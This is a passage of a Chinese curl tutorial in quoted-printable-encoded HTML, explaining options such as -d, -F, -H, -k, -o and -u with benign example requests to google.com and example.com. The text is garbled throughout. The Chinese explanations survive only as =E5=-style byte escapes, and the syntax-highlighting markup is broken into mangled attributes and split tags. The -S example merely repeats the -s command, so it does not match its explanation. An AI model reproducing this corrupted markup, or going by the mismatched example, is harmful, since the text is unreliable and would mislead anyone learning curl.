=86=E5=85=B6=E5=8F=91=E9=80=81=E5=88=B0=E6=9C=8D=E5=8A=A1=E5=99=A8=E3=80=82=
</p>

<h2><strong>-c</strong></h2>

<p><code>-c</code>=E5=8F=82=E6=95=B0=E5=B0=86=E6=9C=8D=E5=8A=A1=E5=99=A8=E8=
=AE=BE=E7=BD=AE=E7=9A=84 Cookie =E5=86=99=E5=85=A5=E4=B8=80=E4=B8=AA=E6=96=
=87=E4=BB=B6=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>c cookies<span class="3D"token=" punctuation">.</span>txt https<span class="3D"token" punctuation">:</span><s= pan class="3D"token" operator">/<span class="3D"token" operator">/www<span class="3D"token" punctuation">.</span>google<span class="3D"token" pu="nctuation"">.</span>com
</span></s=></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E5=B0=86=E6=9C=8D=E5=8A=A1=E5=99=A8=
=E7=9A=84 HTTP =E5=9B=9E=E5=BA=94=E6=89=80=E8=AE=BE=E7=BD=AE Cookie =E5=86=
=99=E5=85=A5=E6=96=87=E6=9C=AC=E6=96=87=E4=BB=B6<code>cookies.txt</code>=E3=
=80=82</p>

<h2><strong>-d</strong></h2>

<p><code>-d</code>=E5=8F=82=E6=95=B0=E7=94=A8=E4=BA=8E=E5=8F=91=E9=80=81 PO=
ST =E8=AF=B7=E6=B1=82=E7=9A=84=E6=95=B0=E6=8D=AE=E4=BD=93=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>d<span class="3D"token" string">'login=3Demma=EF=BC=86password=3D123'</span><span class="3D"token" operator">-</span>X POST https<span class="3D"token" punctuation">:</span><span class="=3D"token" operator">/</span><span class="3D"token" operator">/</span>google<s= pan class="3D"token" punctuation">.com<span class="3D"token" operator">/=
</span>login
<span class="3D"token" comment" spellcheck="3D"true""># =E6=88=96=E8=80=85
</span>$ curl <span class="3D"token" operator">-</span>d <span class="3D"token=" string">'login=3Demma'</span> <span class="3D"token" operator">-</span>d <sp= an class="3D"token" string">'password=3D123' <span class="3D"token" oper="ator"">-</span>X POST  https<span class="3D"token" punctuation">:</span><span = class="3D"token" operator">/</span><span class="3D"token" operator">/</span>goo=
gle<span class="3D"token" punctuation">.</span>com<span class="3D"token" operat="or"">/</span>login
</sp=></s=></code></pre></blockquote>

<p>=E4=BD=BF=E7=94=A8<code>-d</code>=E5=8F=82=E6=95=B0=E4=BB=A5=E5=90=8E=EF=
=BC=8CHTTP =E8=AF=B7=E6=B1=82=E4=BC=9A=E8=87=AA=E5=8A=A8=E5=8A=A0=E4=B8=8A=
=E6=A0=87=E5=A4=B4<code>Content-Type : application/x-www-form-urlencoded=E3=80=82=E5=B9=B6=E4=B8=94=E4=BC=9A=E8=87=AA=E5=8A=A8=E5=B0=86=E8=AF=
=B7=E6=B1=82=E8=BD=AC=E4=B8=BA POST =E6=96=B9=E6=B3=95=EF=BC=8C=E5=9B=A0=E6=
=AD=A4=E5=8F=AF=E4=BB=A5=E7=9C=81=E7=95=A5<code>-X POST</code>=E3=80=82</code></p>

<p><code>-d</code>=E5=8F=82=E6=95=B0=E5=8F=AF=E4=BB=A5=E8=AF=BB=E5=8F=96=E6=
=9C=AC=E5=9C=B0=E6=96=87=E6=9C=AC=E6=96=87=E4=BB=B6=E7=9A=84=E6=95=B0=E6=8D=
=AE=EF=BC=8C=E5=90=91=E6=9C=8D=E5=8A=A1=E5=99=A8=E5=8F=91=E9=80=81=E3=80=82=
</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>d <span class="3D"token" string=">'@data.txt'</span> https<span class=3D" token punctuation">:</span><span c="lass=3D"token" operator">/</span><span class="3D"token" operator">/</span>goog=
le<span class="3D"token" punctuation">.</span>com<span class="3D"token" operato="r"">/</span>login
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E8=AF=BB=E5=8F=96<code>data.txt=E6=96=87=E4=BB=B6=E7=9A=84=E5=86=85=E5=AE=B9=EF=BC=8C=E4=BD=9C=E4=B8=BA=
=E6=95=B0=E6=8D=AE=E4=BD=93=E5=90=91=E6=9C=8D=E5=8A=A1=E5=99=A8=E5=8F=91=E9=
=80=81=E3=80=82</code></p>

<h2><strong>--data-urlencode</strong></h2>

<p><code>--data-urlencode</code>=E5=8F=82=E6=95=B0=E7=AD=89=E5=90=8C=E4=BA=
=8E<code>-d</code>=EF=BC=8C=E5=8F=91=E9=80=81 POST =E8=AF=B7=E6=B1=82=E7=9A=
=84=E6=95=B0=E6=8D=AE=E4=BD=93=EF=BC=8C=E5=8C=BA=E5=88=AB=E5=9C=A8=E4=BA=8E=
=E4=BC=9A=E8=87=AA=E5=8A=A8=E5=B0=86=E5=8F=91=E9=80=81=E7=9A=84=E6=95=B0=E6=
=8D=AE=E8=BF=9B=E8=A1=8C URL =E7=BC=96=E7=A0=81=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">--</span>data<span class="3D"token" ope="rator"">-</span>urlencode <span class="3D"token" string">'comment=3Dhello worl=
d'</span> https<span class="3D"token" punctuation">:</span><span class="3D"tok=" en operator">/</span><span class="3D"token" operator">/</span>google<span cla="ss=3D"token" punctuation">.</span>com<span class="3D"token" operator">/</span>=
login
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E4=BB=A3=E7=A0=81=E4=B8=AD=EF=BC=8C=E5=8F=91=E9=80=81=
=E7=9A=84=E6=95=B0=E6=8D=AE<code>hello world</code>=E4=B9=8B=E9=97=B4=E6=9C=
=89=E4=B8=80=E4=B8=AA=E7=A9=BA=E6=A0=BC=EF=BC=8C=E9=9C=80=E8=A6=81=E8=BF=9B=
=E8=A1=8C URL =E7=BC=96=E7=A0=81=E3=80=82</p>

<h2><strong>-e</strong></h2>

<p><code>-e</code>=E5=8F=82=E6=95=B0=E7=94=A8=E6=9D=A5=E8=AE=BE=E7=BD=AE HT=
TP =E7=9A=84=E6=A0=87=E5=A4=B4<code>Referer</code>=EF=BC=8C=E8=A1=A8=E7=A4=
=BA=E8=AF=B7=E6=B1=82=E7=9A=84=E6=9D=A5=E6=BA=90=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
curl <span class="3D"token" operator">-</span>e <span class="3D"token" string">=
'<a class="3D"token" url-link" href="3D"https://google.com/"">https://google.co=
m</a>?q=3Dexample'</span> https<span class="3D"token" punctuation">:</span><s= pan class="3D"token" operator">/<span class="3D"token" operator">/www<span class="3D"token" punctuation">.</span>example<span class="3D"token" p="unctuation"">.</span>com
</span></s=></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E5=B0=86<code>Referer</code>=E6=A0=
=87=E5=A4=B4=E8=AE=BE=E4=B8=BA<code>https://google.com?q=3Dexample</code>=
=E3=80=82</p>

<p><code>-H</code>=E5=8F=82=E6=95=B0=E5=8F=AF=E4=BB=A5=E9=80=9A=E8=BF=87=E7=
=9B=B4=E6=8E=A5=E6=B7=BB=E5=8A=A0=E6=A0=87=E5=A4=B4<code>Referer</code>=EF=
=BC=8C=E8=BE=BE=E5=88=B0=E5=90=8C=E6=A0=B7=E6=95=88=E6=9E=9C=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
curl <span class="3D"token" operator">-</span>H <span class="3D"token" string">=
'Referer: <a class="3D"token" url-link" href="3D"https://google.com/"">https://=
google.com</a>?q=3Dexample'</span> https<span class="3D"token" punctuation">:=
</span><span class="3D"token" operator">/</span><span class="3D"token" operator=">/</span>www<span class=3D" token punctuation">.</span>example<span class="=3D"token" punctuation">.</span>com
</code></pre></blockquote>

<h2><strong>-F</strong></h2>

<p><code>-F</code>=E5=8F=82=E6=95=B0=E7=94=A8=E6=9D=A5=E5=90=91=E6=9C=8D=E5=
=8A=A1=E5=99=A8=E4=B8=8A=E4=BC=A0=E4=BA=8C=E8=BF=9B=E5=88=B6=E6=96=87=E4=BB=
=B6=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>F <span class="3D"token" string=">'<a class=3D" token email-link" href="3D"mailto:file=3D@photo.png"">file=3D@=
photo.png'</span> https<span class="3D"token" punctuation">:</span><span = class="3D"token" operator">/</span><span class="3D"token" operator">/</span>goo=
gle<span class="3D"token" punctuation">.</span>com<span class="3D"token" operat="or"">/</span>profile
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E4=BC=9A=E7=BB=99 HTTP =E8=AF=B7=E6=
=B1=82=E5=8A=A0=E4=B8=8A=E6=A0=87=E5=A4=B4<code>Content-Type: multipart/for=
m-data</code>=EF=BC=8C=E7=84=B6=E5=90=8E=E5=B0=86=E6=96=87=E4=BB=B6<code>ph=
oto.png</code>=E4=BD=9C=E4=B8=BA<code>file</code>=E5=AD=97=E6=AE=B5=E4=B8=
=8A=E4=BC=A0=E3=80=82</p>

<p><code>-F</code>=E5=8F=82=E6=95=B0=E5=8F=AF=E4=BB=A5=E6=8C=87=E5=AE=9A MI=
ME =E7=B1=BB=E5=9E=8B=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>F <span class="3D"token" string=">'<a class=3D" token email-link" href="3D"mailto:file=3D@photo.png"">file=3D@=
photo.png;type=3Dimage/png'</span> https<span class="3D"token" punctuatio="n"">:</span><span class="3D"token" operator">/</span><span class="3D"token" oper="ator"">/</span>google<span class="3D"token" punctuation">.</span>com<span clas="s=3D"token" operator">/</span>profile
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E6=8C=87=E5=AE=9A MIME =E7=B1=BB=E5=
=9E=8B=E4=B8=BA<code>image/png</code>=EF=BC=8C=E5=90=A6=E5=88=99 curl =E4=
=BC=9A=E6=8A=8A MIME =E7=B1=BB=E5=9E=8B=E8=AE=BE=E4=B8=BA<code>application/=
octet-stream</code>=E3=80=82</p>

<p><code>-F</code>=E5=8F=82=E6=95=B0=E4=B9=9F=E5=8F=AF=E4=BB=A5=E6=8C=87=E5=
=AE=9A=E6=96=87=E4=BB=B6=E5=90=8D=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>F <span class="3D"token" string=">'<a class=3D" token email-link" href="3D"mailto:file=3D@photo.png"">file=3D@=
photo.png;filename=3Dme.png'</span> https<span class="3D"token" punctuati="on"">:</span><span class="3D"token" operator">/</span><span class="3D"token" ope="rator"">/</span>google<span class="3D"token" punctuation">.</span>com<span cla="ss=3D"token" operator">/</span>profile
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E4=B8=AD=EF=BC=8C=E5=8E=9F=E5=A7=8B=
=E6=96=87=E4=BB=B6=E5=90=8D=E4=B8=BA<code>photo.png</code>=EF=BC=8C=E4=BD=
=86=E6=98=AF=E6=9C=8D=E5=8A=A1=E5=99=A8=E6=8E=A5=E6=94=B6=E5=88=B0=E7=9A=84=
=E6=96=87=E4=BB=B6=E5=90=8D=E4=B8=BA<code>me.png</code>=E3=80=82</p>

<h2><strong>-G</strong></h2>

<p><code>-G</code>=E5=8F=82=E6=95=B0=E7=94=A8=E6=9D=A5=E6=9E=84=E9=80=A0 UR=
L =E7=9A=84=E6=9F=A5=E8=AF=A2=E5=AD=97=E7=AC=A6=E4=B8=B2=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>G <span class="3D"token" operat="or"">-</span>d <span class="3D"token" string">'q=3Dkitties'</span> <span class="=3D"token" operator">-</span>d <span class="3D"token" string">'count=3D20' https<span class="3D"token" punctuation">:</span><span class="3D"token" ope="rator"">/</span><span class="3D"token" operator">/</span>google<span class="3D"=" token punctuation">.</span>com<span class="3D"token" operator">/</span>search
</span></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E4=BC=9A=E5=8F=91=E5=87=BA=E4=B8=80=
=E4=B8=AA GET =E8=AF=B7=E6=B1=82=EF=BC=8C=E5=AE=9E=E9=99=85=E8=AF=B7=E6=B1=
=82=E7=9A=84 URL =E4=B8=BA<code>https://google.com/search?q=3Dkitties&amp;c=
ount=3D20</code>=E3=80=82=E5=A6=82=E6=9E=9C=E7=9C=81=E7=95=A5<code>--G=EF=BC=8C=E4=BC=9A=E5=8F=91=E5=87=BA=E4=B8=80=E4=B8=AA POST =E8=AF=B7=E6=
=B1=82=E3=80=82</code></p>

<p>=E5=A6=82=E6=9E=9C=E6=95=B0=E6=8D=AE=E9=9C=80=E8=A6=81 URL =E7=BC=96=E7=
=A0=81=EF=BC=8C=E5=8F=AF=E4=BB=A5=E7=BB=93=E5=90=88<code>--data--urlencode<= code>=E5=8F=82=E6=95=B0=E3=80=82</=></code></p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>G <span class="3D"token" operat="or"">--</span>data<span class="3D"token" operator">-</span>urlencode <span cla="ss=3D"token" string">'comment=3Dhello world'</span> https<span class="3D"toke=" n punctuation">:</span><span class="3D"token" operator">/</span><span class="=3D"token" operator">/</span>www<span class="3D"token" punctuation">.</span>ex=
ample<span class="3D"token" punctuation">.</span>com
</code></pre></blockquote>

<h2><strong>-H</strong></h2>

<p><code>-H</code>=E5=8F=82=E6=95=B0=E6=B7=BB=E5=8A=A0 HTTP =E8=AF=B7=E6=B1=
=82=E7=9A=84=E6=A0=87=E5=A4=B4=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>H <span class="3D"token" string=">'Accept-Language: en-US'</span> https<span class=3D" token punctuation">:<= span><span class="3D"token" operator">/</span><span class="3D"token" operator">/</span>google<span class="3D"token" punctuation">.</span>com
</=></span></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E6=B7=BB=E5=8A=A0 HTTP =E6=A0=87=E5=
=A4=B4<code>Accept-Language: en-US</code>=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>H <span class="3D"token" string=">'Accept-Language: en-US'</span> <span class=3D" token operator">-</span>H =
<span class="3D"token" string">'Secret-Message: xyzzy'</span> https<span clas="s=3D"token" punctuation">:</span><span class="3D"token" operator">/</span><spa= n class="3D"token" operator">/google<span class="3D"token" punctuation">=
.</span>com
</spa=></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E6=B7=BB=E5=8A=A0=E4=B8=A4=E4=B8=AA=
 HTTP =E6=A0=87=E5=A4=B4=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>d <span class="3D"token" string=">'{" login": "emma", "pass": "123"}'< span> <span class="3D"token" operator">=
-</span>H <span class="3D"token" string">'Content-Type: application/json' https<span class="3D"token" punctuation">:</span><span class="3D"token" ope="rator"">/</span><span class="3D"token" operator">/</span>google<span class="3D"=" token punctuation">.</span>com<span class="3D"token" operator">/</span>login
</span></span></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E6=B7=BB=E5=8A=A0 HTTP =E8=AF=B7=E6=
=B1=82=E7=9A=84=E6=A0=87=E5=A4=B4=E6=98=AF<code>Content-Type: application/j=
son</code>=EF=BC=8C=E7=84=B6=E5=90=8E=E7=94=A8<code>-d</code>=E5=8F=82=E6=
=95=B0=E5=8F=91=E9=80=81 JSON =E6=95=B0=E6=8D=AE=E3=80=82</p>

<h2><strong>-i</strong></h2>

<p><code>-i</code>=E5=8F=82=E6=95=B0=E6=89=93=E5=8D=B0=E5=87=BA=E6=9C=8D=E5=
=8A=A1=E5=99=A8=E5=9B=9E=E5=BA=94=E7=9A=84 HTTP =E6=A0=87=E5=A4=B4=E3=80=82=
</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>i https<span class="3D"token" p="unctuation"">:</span><span class="3D"token" operator">/</span><span class="3D"t=" oken operator">/</span>www<span class="3D"token" punctuation">.</span>example=
<span class="3D"token" punctuation">.</span>com
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E6=94=B6=E5=88=B0=E6=9C=8D=E5=8A=A1=
=E5=99=A8=E5=9B=9E=E5=BA=94=E5=90=8E=EF=BC=8C=E5=85=88=E8=BE=93=E5=87=BA=E6=
=9C=8D=E5=8A=A1=E5=99=A8=E5=9B=9E=E5=BA=94=E7=9A=84=E6=A0=87=E5=A4=B4=EF=BC=
=8C=E7=84=B6=E5=90=8E=E7=A9=BA=E4=B8=80=E8=A1=8C=EF=BC=8C=E5=86=8D=E8=BE=93=
=E5=87=BA=E7=BD=91=E9=A1=B5=E7=9A=84=E6=BA=90=E7=A0=81=E3=80=82</p>

<h2><strong>-I</strong></h2>

<p><code>-I</code>=E5=8F=82=E6=95=B0=E5=90=91=E6=9C=8D=E5=8A=A1=E5=99=A8=E5=
=8F=91=E5=87=BA HEAD =E8=AF=B7=E6=B1=82=EF=BC=8C=E7=84=B6=E4=BC=9A=E5=B0=86=
=E6=9C=8D=E5=8A=A1=E5=99=A8=E8=BF=94=E5=9B=9E=E7=9A=84 HTTP =E6=A0=87=E5=A4=
=B4=E6=89=93=E5=8D=B0=E5=87=BA=E6=9D=A5=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>I https<span class="3D"token" p="unctuation"">:</span><span class="3D"token" operator">/</span><span class="3D"t=" oken operator">/</span>www<span class="3D"token" punctuation">.</span>example=
<span class="3D"token" punctuation">.</span>com
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E8=BE=93=E5=87=BA=E6=9C=8D=E5=8A=A1=
=E5=99=A8=E5=AF=B9 HEAD =E8=AF=B7=E6=B1=82=E7=9A=84=E5=9B=9E=E5=BA=94=E3=80=
=82</p>

<p><code>--head</code>=E5=8F=82=E6=95=B0=E7=AD=89=E5=90=8C=E4=BA=8E<code>-I=
</code>=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">--</span>head https<span class="3D"tok=" en punctuation">:</span><span class="3D"token" operator">/</span><span class="=3D"token" operator">/</span>www<span class="3D"token" punctuation">.</span>ex=
ample<span class="3D"token" punctuation">.</span>com
</code></pre></blockquote>

<h2><strong>-k</strong></h2>

<p><code>-k</code>=E5=8F=82=E6=95=B0=E6=8C=87=E5=AE=9A=E8=B7=B3=E8=BF=87 SS=
L =E6=A3=80=E6=B5=8B=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>k https<span class="3D"token" p="unctuation"">:</span><span class="3D"token" operator">/</span><span class="3D"t=" oken operator">/</span>www<span class="3D"token" punctuation">.</span>example=
<span class="3D"token" punctuation">.</span>com
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E4=B8=8D=E4=BC=9A=E6=A3=80=E6=9F=A5=
=E6=9C=8D=E5=8A=A1=E5=99=A8=E7=9A=84 SSL =E8=AF=81=E4=B9=A6=E6=98=AF=E5=90=
=A6=E6=AD=A3=E7=A1=AE=E3=80=82</p>

<h2><strong>-L</strong></h2>

<p><code>-L</code>=E5=8F=82=E6=95=B0=E4=BC=9A=E8=AE=A9 HTTP =E8=AF=B7=E6=B1=
=82=E8=B7=9F=E9=9A=8F=E6=9C=8D=E5=8A=A1=E5=99=A8=E7=9A=84=E9=87=8D=E5=AE=9A=
=E5=90=91=E3=80=82curl =E9=BB=98=E8=AE=A4=E4=B8=8D=E8=B7=9F=E9=9A=8F=E9=87=
=8D=E5=AE=9A=E5=90=91=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>L <span class="3D"token" operat="or"">-</span>d <span class="3D"token" string">'tweet=3Dhi'</span> https<span c="lass=3D"token" punctuation">:</span><span class="3D"token" operator">/</span><= span class="3D"token" operator">/api<span class="3D"token" punctuation">=
.</span>twitter<span class="3D"token" punctuation">.</span>com<span class="3D"=" token operator">/</span>tweet
</=></code></pre></blockquote>

<h2><strong>--limit-rate</strong></h2>

<p><code>--limit-rate</code>=E7=94=A8=E6=9D=A5=E9=99=90=E5=88=B6 HTTP =E8=
=AF=B7=E6=B1=82=E5=92=8C=E5=9B=9E=E5=BA=94=E7=9A=84=E5=B8=A6=E5=AE=BD=EF=BC=
=8C=E6=A8=A1=E6=8B=9F=E6=85=A2=E7=BD=91=E9=80=9F=E7=9A=84=E7=8E=AF=E5=A2=83=
=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">--</span>limit<span class="3D"token" op="erator"">-</span>rate 200k https<span class="3D"token" punctuation">:</span><s= pan class="3D"token" operator">/<span class="3D"token" operator">/google<span class="3D"token" punctuation">.</span>com
</span></s=></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E5=B0=86=E5=B8=A6=E5=AE=BD=E9=99=90=
=E5=88=B6=E5=9C=A8=E6=AF=8F=E7=A7=92 200K =E5=AD=97=E8=8A=82=E3=80=82</p>

<h2><strong>-o</strong></h2>

<p><code>-o</code>=E5=8F=82=E6=95=B0=E5=B0=86=E6=9C=8D=E5=8A=A1=E5=99=A8=E7=
=9A=84=E5=9B=9E=E5=BA=94=E4=BF=9D=E5=AD=98=E6=88=90=E6=96=87=E4=BB=B6=EF=BC=
=8C=E7=AD=89=E5=90=8C=E4=BA=8E<code>wget</code>=E5=91=BD=E4=BB=A4=E3=80=82<= p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>o example<span class="3D"token=" punctuation">.</span>html https<span class="3D"token" punctuation">:</span><= span class="3D"token" operator">/<span class="3D"token" operator">/www<span class="3D"token" punctuation">.</span>example<span class="3D"token" = punctuation">.</span>com
</span></=></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E5=B0=86<code>www.example.com=E4=BF=9D=E5=AD=98=E6=88=90<code>example.html</code>=E3=80=82</code></p>

<h2><strong>-O</strong></h2>

<p><code>-O</code>=E5=8F=82=E6=95=B0=E5=B0=86=E6=9C=8D=E5=8A=A1=E5=99=A8=E5=
=9B=9E=E5=BA=94=E4=BF=9D=E5=AD=98=E6=88=90=E6=96=87=E4=BB=B6=EF=BC=8C=E5=B9=
=B6=E5=B0=86 URL =E7=9A=84=E6=9C=80=E5=90=8E=E9=83=A8=E5=88=86=E5=BD=93=E4=
=BD=9C=E6=96=87=E4=BB=B6=E5=90=8D=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>O https<span class="3D"token" p="unctuation"">:</span><span class="3D"token" operator">/</span><span class="3D"t=" oken operator">/</span>www<span class="3D"token" punctuation">.</span>example=
<span class="3D"token" punctuation">.</span>com<span class="3D"token" operator">/</span>foo<span class="3D"token" operator">/</span>bar<span class="3D"token" = punctuation">.</span>html
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E5=B0=86=E6=9C=8D=E5=8A=A1=E5=99=A8=
=E5=9B=9E=E5=BA=94=E4=BF=9D=E5=AD=98=E6=88=90=E6=96=87=E4=BB=B6=EF=BC=8C=E6=
=96=87=E4=BB=B6=E5=90=8D=E4=B8=BA<code>bar.html</code>=E3=80=82</p>

<h2><strong>-s</strong></h2>

<p><code>-s</code>=E5=8F=82=E6=95=B0=E5=B0=86=E4=B8=8D=E8=BE=93=E5=87=BA=E9=
=94=99=E8=AF=AF=E5=92=8C=E8=BF=9B=E5=BA=A6=E4=BF=A1=E6=81=AF=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>s https<span class="3D"token" p="unctuation"">:</span><span class="3D"token" operator">/</span><span class="3D"t=" oken operator">/</span>www<span class="3D"token" punctuation">.</span>example=
<span class="3D"token" punctuation">.</span>com
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E4=B8=80=E6=97=A6=E5=8F=91=E7=94=9F=
=E9=94=99=E8=AF=AF=EF=BC=8C=E4=B8=8D=E4=BC=9A=E6=98=BE=E7=A4=BA=E9=94=99=E8=
=AF=AF=E4=BF=A1=E6=81=AF=E3=80=82=E4=B8=8D=E5=8F=91=E7=94=9F=E9=94=99=E8=AF=
=AF=E7=9A=84=E8=AF=9D=EF=BC=8C=E4=BC=9A=E6=AD=A3=E5=B8=B8=E6=98=BE=E7=A4=BA=
=E8=BF=90=E8=A1=8C=E7=BB=93=E6=9E=9C=E3=80=82</p>

<p>=E5=A6=82=E6=9E=9C=E6=83=B3=E8=AE=A9 curl =E4=B8=8D=E4=BA=A7=E7=94=9F=E4=
=BB=BB=E4=BD=95=E8=BE=93=E5=87=BA=EF=BC=8C=E5=8F=AF=E4=BB=A5=E4=BD=BF=E7=94=
=A8=E4=B8=8B=E9=9D=A2=E7=9A=84=E5=91=BD=E4=BB=A4=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>s <span class="3D"token" operat="or"">-</span>o <span class="3D"token" operator">/</span>dev<span class="3D"toke=" n operator">/</span>null https<span class="3D"token" punctuation">:</span><sp= an class="3D"token" operator">/<span class="3D"token" operator">/</span>=
google<span class="3D"token" punctuation">.</span>com
</sp=></code></pre></blockquote>

<h2><strong>-S</strong></h2>

<p><code>-S</code>=E5=8F=82=E6=95=B0=E6=8C=87=E5=AE=9A=E5=8F=AA=E8=BE=93=E5=
=87=BA=E9=94=99=E8=AF=AF=E4=BF=A1=E6=81=AF=EF=BC=8C=E9=80=9A=E5=B8=B8=E4=B8=
=8E<code>-s</code>=E4=B8=80=E8=B5=B7=E4=BD=BF=E7=94=A8=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>s <span class="3D"token" operat="or"">-</span>o <span class="3D"token" operator">/</span>dev<span class="3D"toke=" n operator">/</span>null https<span class="3D"token" punctuation">:</span><sp= an class="3D"token" operator">/<span class="3D"token" operator">/</span>=
google<span class="3D"token" punctuation">.</span>com
</sp=></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E6=B2=A1=E6=9C=89=E4=BB=BB=E4=BD=95=
=E8=BE=93=E5=87=BA=EF=BC=8C=E9=99=A4=E9=9D=9E=E5=8F=91=E7=94=9F=E9=94=99=E8=
=AF=AF=E3=80=82</p>

<h2><strong>-u</strong></h2>

<p><code>-u</code>=E5=8F=82=E6=95=B0=E7=94=A8=E6=9D=A5=E8=AE=BE=E7=BD=AE=E6=
=9C=8D=E5=8A=A1=E5=99=A8=E8=AE=A4=E8=AF=81=E7=9A=84=E7=94=A8=E6=88=B7=E5=90=
=8D=E5=92=8C=E5=AF=86=E7=A0=81=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>u <span class="3D"token" string=">'bob:12345'</span> https<span class=3D" token punctuation">:</span><span c="lass=3D"token" operator">/</span><span class="3D"token" operator">/</span>goog=
le<span class="3D"token" punctuation">.</span>com<span class="3D"token" operato="r"">/</span>login
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E8=AE=BE=E7=BD=AE=E7=94=A8=E6=88=B7=
=E5=90=8D=E4=B8=BA<code>bob</code>=EF=BC=8C=E5=AF=86=E7=A0=81=E4=B8=BA<code=>12345=EF=BC=8C=E7=84=B6=E5=90=8E=E5=B0=86=E5=85=B6=E8=BD=AC=E4=B8=
=BA HTTP =E6=A0=87=E5=A4=B4<code>Authorization: Basic Ym9iOjEyMzQ1</code>=
=E3=80=82</code=></p>

<p>curl =E8=83=BD=E5=A4=9F=E8=AF=86=E5=88=AB URL =E9=87=8C=E9=9D=A2=E7=9A=
=84=E7=94=A8=E6=88=B7=E5=90=8D=E5=92=8C=E5=AF=86=E7=A0=81=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl https<span class="3D"token" punctuation">:</span><span class="3D"token" = operator">/</span><span class="3D"token" operator">/</span>bob<span class="3D"=" token punctuation">:</span><span class="3D"token" number">12345</span>@google=
<span class="3D"token" punctuation">.</span>com<span class="3D"token" operator">/</span>login
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E8=83=BD=E5=A4=9F=E8=AF=86=E5=88=AB=
 URL =E9=87=8C=E9=9D=A2=E7=9A=84=E7=94=A8=E6=88=B7=E5=90=8D=E5=92=8C=E5=AF=
=86=E7=A0=81=EF=BC=8C=E5=B0=86=E5=85=B6=E8=BD=AC=E4=B8=BA=E4=B8=8A=E4=B8=AA=
